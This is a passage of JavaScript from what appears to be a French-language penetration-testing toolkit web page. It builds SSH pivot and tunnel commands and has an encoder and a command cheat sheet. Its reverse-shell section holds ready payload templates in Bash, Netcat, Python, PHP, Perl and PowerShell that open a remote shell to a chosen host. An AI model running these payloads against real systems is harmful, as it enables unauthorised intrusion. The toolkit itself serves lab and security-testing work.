                    '<p class="mb-2"><span class="text-emerald-400">1.</span> Lance cette commande sur ton PC.</p>' +
                    '<p class="mb-2"><span class="text-emerald-400">2.</span> Ajoute dans <code class="bg-zinc-800 px-1 rounded text-zinc-300">/etc/proxychains4.conf</code> :</p>' +
                    '<pre class="bg-zinc-900 border border-zinc-800 p-2 rounded text-[11px] text-zinc-400 font-mono mt-1">socks5 127.0.0.1 ' + lPort + '</pre>' +
                    '<p class="mt-3"><span class="text-emerald-400">3.</span> Scanne le réseau interne via le proxy :</p>' +
                    '<pre class="bg-zinc-900 border border-zinc-800 p-2 rounded text-[11px] text-zinc-400 font-mono mt-1">proxychains nmap -sT 192.168.x.x</pre>';
            } else if (type === 'local') {
                cmd = 'ssh -L ' + lPort + ':' + tIp + ':' + tPort + ' -N -q ' + pUser + '@' + pIp;
                instructions =
                    '<p class="mb-2"><span class="text-emerald-400">1.</span> Lance cette commande sur ton PC.</p>' +
                    '<p class="mb-2"><span class="text-emerald-400">2.</span> Le service interne est transféré vers ton PC local.</p>' +
                    '<p class="mt-3"><span class="text-emerald-400">3.</span> Accède au service via :</p>' +
                    '<pre class="bg-zinc-900 border border-zinc-800 p-2 rounded text-[11px] text-zinc-400 font-mono mt-1">http://127.0.0.1:' + lPort + '</pre>';
            } else {
                cmd = 'ssh -R ' + tPort + ':127.0.0.1:' + lPort + ' -N -q ' + pUser + '@' + pIp;
                instructions =
                    '<p class="mb-2"><span class="text-red-400 font-bold">Attention :</span> expose un service local au réseau cible.</p>' +
                    '<p class="mt-3"><span class="text-emerald-400">1.</span> Listener local : <code class="text-zinc-400">nc -lvnp ' + lPort + '</code></p>' +
                    '<p><span class="text-emerald-400">2.</span> La cible se connecte à l\'IP du pivot sur le port ' + tPort + '.</p>';
            }
            if (outCmd) outCmd.textContent = cmd;
            if (outInst) outInst.innerHTML = instructions;
        });
        btnBuildPivot.click();
    }

    // =========================================================================
    // 10. REVERSE SHELLS
    // =========================================================================

    const revShells = {
        bash: 'bash -i >& /dev/tcp/LHOST/LPORT 0>&1',
        nc: 'nc LHOST LPORT -e /bin/sh',
        'nc-mkfifo': 'rm -f /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc LHOST LPORT >/tmp/f',
        python: `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("LHOST",LPORT));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty;pty.spawn("/bin/bash")'`,
        php: `php -r '$sock=fsockopen("LHOST",LPORT);exec("/bin/sh -i <&3 >&3 2>&3");'`,
        perl: `perl -e 'use Socket;$i="LHOST";$p=LPORT;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'`,
        powershell: `powershell -nop -c "$c=New-Object System.Net.Sockets.TCPClient('LHOST',LPORT);$s=$c.GetStream();[byte[]]$b=0..65535|%{0};while(($i=$s.Read($b,0,$b.Length)) -ne 0){;$d=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($b,0,$i);$sb=(iex $d 2>&1|Out-String);$sb2=$sb+'PS '+(pwd).Path+'> ';$sby=([text.encoding]::ASCII).GetBytes($sb2);$s.Write($sby,0,$sby.Length);$s.Flush()};$c.Close()"`
    };
    const revLabels = { bash: 'Bash', nc: 'Netcat', 'nc-mkfifo': 'Netcat (mkfifo)', python: 'Python 3', php: 'PHP', perl: 'Perl', powershell: 'PowerShell' };

    const revBuildBtn = $('rev-build');
    if (revBuildBtn) {
        revBuildBtn.addEventListener('click', () => {
            const ip = ($('rev-ip').value || '10.10.14.1').trim();
            const port = ($('rev-port').value || '4444').trim();
            const type = $('rev-type').value;
            const tpl = revShells[type] || revShells.bash;
            const payload = tpl.split('LHOST').join(ip).split('LPORT').join(port);
            const out = $('rev-output');
            const label = $('rev-lang-label');
            if (out) out.textContent = payload;
            if (label) label.textContent = 'Payload — ' + (revLabels[type] || type);
        });
    }

    // =========================================================================
    // 11. ENCODEUR / DÉCODEUR
    // =========================================================================

    function b64encode(str) { return btoa(unescape(encodeURIComponent(str))); }
    function b64decode(str) { return decodeURIComponent(escape(atob(str.trim()))); }
    function hexEncode(str) {
        return Array.from(new TextEncoder().encode(str)).map(b => b.toString(16).padStart(2, '0')).join(' ');
    }
    function hexDecode(str) {
        const clean = str.replace(/0x/gi, '').replace(/[\s,:]+/g, '');
        if (clean.length % 2 !== 0) throw new Error('longueur hex impaire');
        const bytes = new Uint8Array(clean.match(/.{2}/g).map(h => parseInt(h, 16)));
        return new TextDecoder().decode(bytes);
    }

    document.querySelectorAll('.enc-btn').forEach(btn => {
        btn.addEventListener('click', () => {
            const mode = btn.getAttribute('data-enc');
            const input = ($('enc-input') && $('enc-input').value) || '';
            const out = $('enc-output');
            if (!out) return;
            let result = '';
            try {
                if (mode === 'b64enc') result = b64encode(input);
                else if (mode === 'b64dec') result = b64decode(input);
                else if (mode === 'urlenc') result = encodeURIComponent(input);
                else if (mode === 'urldec') result = decodeURIComponent(input);
                else if (mode === 'hexenc') result = hexEncode(input);
                else if (mode === 'hexdec') result = hexDecode(input);
                out.classList.remove('text-red-400');
                out.classList.add('text-emerald-400');
                out.textContent = result || '(vide)';
            } catch (e) {
                out.classList.remove('text-emerald-400');
                out.classList.add('text-red-400');
                out.textContent = 'Erreur : entrée invalide pour cette opération (' + e.message + ')';
            }
        });
    });

    // =========================================================================
    // 12. CHEAT-SHEET
    // =========================================================================

    const cheatData = [
        {
            title: 'Nmap — essentiel', color: 'text-accent-400',
            items: [
                ['nmap -sV -sC -oA scan <ip>', 'Scan versions + scripts, sauvegarde'],
                ['nmap -p- --min-rate 5000 <ip>', 'Tous les ports, rapide'],
                ['nmap -sU --top-ports 100 <ip>', 'Top 100 ports UDP'],
                ['nmap -sn 192.168.1.0/24', 'Découverte d\'hôtes (ping sweep)']
            ]
        },
        {
            title: 'Netcat', color: 'text-emerald-400',
            items: [
                ['nc -lvnp 4444', 'Listener (écoute)'],
                ['nc <ip> 4444', 'Se connecter'],
                ['nc -lvnp 4444 > fichier', 'Recevoir un fichier'],
                ['nc <ip> 4444 < fichier', 'Envoyer un fichier']
            ]
        },
        {
            title: 'Transfert de fichiers', color: 'text-blue-400',
            items: [
                ['python3 -m http.server 8000', 'Serveur HTTP rapide'],
                ['wget http://<ip>:8000/f', 'Télécharger (Linux)'],
                ['curl -O http://<ip>:8000/f', 'Télécharger (curl)'],
                ['scp f user@<ip>:/tmp/', 'Copier via SSH']
            ]
        },
        {
            title: 'Linux — énumération', color: 'text-amber-400',
            items: [
                ['sudo -l', 'Droits sudo'],
                ['find / -perm -4000 2>/dev/null', 'Binaires SUID'],
                ['uname -a', 'Version du noyau'],
                ['cat /etc/crontab', 'Tâches planifiées']
            ]
        },
        {
            title: 'Ports courants', color: 'text-purple-400',
            items: [
                ['21 FTP · 22 SSH · 23 Telnet', 'Accès distant'],
                ['25 SMTP · 53 DNS · 80 HTTP', 'Services de base'],
                ['443 HTTPS · 445 SMB · 3389 RDP', 'Web / Windows'],
                ['3306 MySQL · 5432 PostgreSQL', 'Bases de données']
            ]
        },
        {
            title: 'Git rapide', color: 'text-red-400',
            items: [
                ['git status', 'État du dépôt'],
                ['git add . && git commit -m "msg"', 'Commit'],
                ['git log --oneline --graph', 'Historique compact'],
                ['git checkout -b <branche>', 'Nouvelle branche']
            ]
        }
    ];

    let cheatRendered = false;
    function renderCheatsheet() {
        if (cheatRendered) return;
        const grid = $('cheatsheet-grid');
        if (!grid) return;
        let html = '';
        cheatData.forEach(cat => {
            html += '<div class="bg-zinc-900/20 border border-zinc-800 rounded-xl p-4 space-y-2">' +
                '<h3 class="text-sm font-semibold ' + cat.color + ' mb-2">' + cat.title + '</h3>';
            cat.items.forEach((pair) => {
                const cmd = pair[0], desc = pair[1];
                const uid = 'cs-' + Math.random().toString(36).slice(2, 9);
                html += '<pre id="' + uid + '" class="bg-zinc-900 border border-zinc-800 rounded px-2 py-1.5 text-[11px] text-zinc-100 overflow-x-auto font-mono cursor-pointer hover:bg-zinc-800 transition-colors" onclick="copyTextFromElement(\'' + uid + '\')">' + escapeHtml(cmd) + '</pre>' +
                    '<p class="text-[10px] text-zinc-500 mb-1 ml-1">' + escapeHtml(desc) + '</p>';
            });
            html += '</div>';
        });
        grid.innerHTML = html;
        cheatRendered = true;
    }

    // =========================================================================
    // 13. PERSISTANCE (localStorage) DES CHAMPS
    // =========================================================================

    const fieldsToSave = ['subnet-ip', 'subnet-mask', 'source-input', 'iface-input',
        'input-ports', 'scan-target', 'scan-ports', 'traffic-iface', 'traffic-filter',
        'rev-ip', 'rev-port', 'pivot-user', 'pivot-ip'];

    fieldsToSave.forEach(id => {
        const el = $(id);
        if (!el) return;
        const saved = localStorage.getItem('netcmd_' + id);
        if (saved !== null) el.value = saved;
        el.addEventListener('input', () => {
            try { localStorage.setItem('netcmd_' + id, el.value); } catch (e) {}
        });
    });

    // =========================================================================
    // 14. INITIALISATION
    // =========================================================================

    showModule('firewall');
    updateFirewallCommand();
});
